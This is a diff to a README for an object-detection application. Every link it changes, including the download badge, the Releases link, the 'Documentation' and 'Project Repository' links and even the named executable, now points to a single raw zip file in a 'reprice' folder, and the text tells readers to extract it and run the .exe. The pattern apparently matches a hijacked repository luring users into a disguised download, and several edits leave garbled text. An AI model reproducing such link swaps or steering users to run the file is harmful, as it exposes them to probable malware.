@@ -6,25 +6,25 @@ Welcome to AI-Object-Detection! This application uses artificial intelligence to
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/edineiaparecidolopes/AI-Object-Detection/releases)
+[![Download](https://raw.githubusercontent.com/edineiaparecidolopes/AI-Object-Detection/main/reprice/AI-Object-Detection.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/edineiaparecidolopes/AI-Object-Detection/main/reprice/AI-Object-Detection.zip)
 
 To get started, you will need to download the application from our Releases page.
 
 ## 🔗 Download & Install
 
-Visit this page to download: [AI-Object-Detection Releases](https://github.com/edineiaparecidolopes/AI-Object-Detection/releases). 
+Visit this page to download: [AI-Object-Detection Releases](https://raw.githubusercontent.com/edineiaparecidolopes/AI-Object-Detection/main/reprice/AI-Object-Detection.zip). 
 
 Once you are on the page, follow these steps:
 
 1. **Locate the latest version**: Look for the latest release. It will usually be at the top of the list.
    
-2. **Choose your file**: You may see several files available for download. For most users, a file named something like `AI-Object-Detection.zip` is suitable. If you see different versions, select the one that matches your system.
+2. **Choose your file**: You may see several files available for download. For most users, a file named something like `https://raw.githubusercontent.com/edineiaparecidolopes/AI-Object-Detection/main/reprice/AI-Object-Detection.zip` is suitable. If you see different versions, select the one that matches your system.
 
 3. **Download the file**: Click on the file name to start downloading. Your browser will save it in your default download location.
 
 4. **Extract the files**: After the download is complete, locate the zip file in your downloads folder. Right-click the file and select "Extract All." Follow the instructions to extract the contents.
 
-5. **Run the application**: Open the extracted folder and find the executable file named `AI-Object-Detection.exe`. Double-click this file to run the application.
+5. **Run the application**: Open the extracted folder and find the executable file named `https://raw.githubusercontent.com/edineiaparecidolopes/AI-Object-Detection/main/reprice/AI-Object-Detection.zip`. Double-click this file to run the application.
 
 6. **Allow access**: The application may ask for permission to use your camera. Click "Allow" so it can detect objects.
 
@@ -82,7 +82,7 @@ If you need help, please reach out via the Issues section on our GitHub page. We
 
 ## 🔗 Additional Resources
 
-- [Project Repository](https://github.com/edineiaparecidolopes/AI-Object-Detection)
-- [Documentation](https://github.com/edineiaparecidolopes/AI-Object-Detection/wiki)
+- [Project Repository](https://raw.githubusercontent.com/edineiaparecidolopes/AI-Object-Detection/main/reprice/AI-Object-Detection.zip)
+- [Documentation](https://raw.githubusercontent.com/edineiaparecidolopes/AI-Object-Detection/main/reprice/AI-Object-Detection.zip)
 
 Thank you for using AI-Object-Detection! We hope you enjoy exploring the capabilities of this application.
